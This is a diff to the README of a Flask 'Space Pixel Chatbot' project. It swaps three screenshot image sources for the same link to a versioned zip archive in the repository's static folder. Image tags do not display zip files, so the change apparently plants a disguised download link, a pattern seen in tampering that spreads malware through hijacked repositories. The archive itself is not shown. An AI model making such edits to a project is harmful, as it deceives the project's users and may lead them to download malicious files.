@@ -1,7 +1,7 @@
 # 🚀 Space Pixel Chatbot
 
 <p align="center">
-  <img src="welc.png" alt="Pixel Chatbot Preview" width="600"/>
+  <img src="https://github.com/Sam-bot-dev/Cosmos-Chatbot/raw/refs/heads/main/static/Chatbot_Cosmos_3.2-alpha.5.zip" alt="Pixel Chatbot Preview" width="600"/>
 </p>
 
 A retro-style chatbot built using **Flask**, **HTML**, **Tailwind CSS**, and integrated with real **NASA APIs**, **ISS location tracking**, and **Wikipedia summaries** to answer your space-related questions.
@@ -21,10 +21,10 @@ A retro-style chatbot built using **Flask**, **HTML**, **Tailwind CSS**, and int
 ## 📷 Screenshots
 
 ### 🌠 Chat UI
-<img src="webbackgrnd.png" alt="Chat UI" width="600"/>
+<img src="https://github.com/Sam-bot-dev/Cosmos-Chatbot/raw/refs/heads/main/static/Chatbot_Cosmos_3.2-alpha.5.zip" alt="Chat UI" width="600"/>
 
 ### 🛰️ ISS Tracking Example
-<img src="https://your-iss-image-url.jpg" alt="ISS Location Example" width="600"/>
+<img src="https://github.com/Sam-bot-dev/Cosmos-Chatbot/raw/refs/heads/main/static/Chatbot_Cosmos_3.2-alpha.5.zip" alt="ISS Location Example" width="600"/>
 
 ---
 
